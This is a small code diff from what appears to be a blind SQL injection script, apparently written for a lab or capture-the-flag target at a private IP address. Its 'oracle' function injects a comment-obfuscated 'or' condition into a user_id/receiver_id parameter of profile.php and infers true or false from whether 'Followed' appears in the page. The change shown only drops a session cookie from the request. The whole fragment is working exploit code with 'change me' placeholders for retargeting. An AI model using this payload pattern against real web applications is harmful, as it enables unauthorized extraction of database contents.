@@ -8,7 +8,7 @@ def oracle(condition):
     url = 'http://192.168.209.240/pages/profile.php?user_id=1&receiver_id=' # change me
     query = f"1/**/or/**/{condition}%23" # change me
     #cookies={"PHPSESSID":"4d7nv0vm6kalte4qq4q8lo0pbq"}
-    response = session.get(url+query,cookies=cookies) # maybe change me
+    response = session.get(url+query) # maybe change me
     #print(url+query)
     return "Followed" in response.text
 
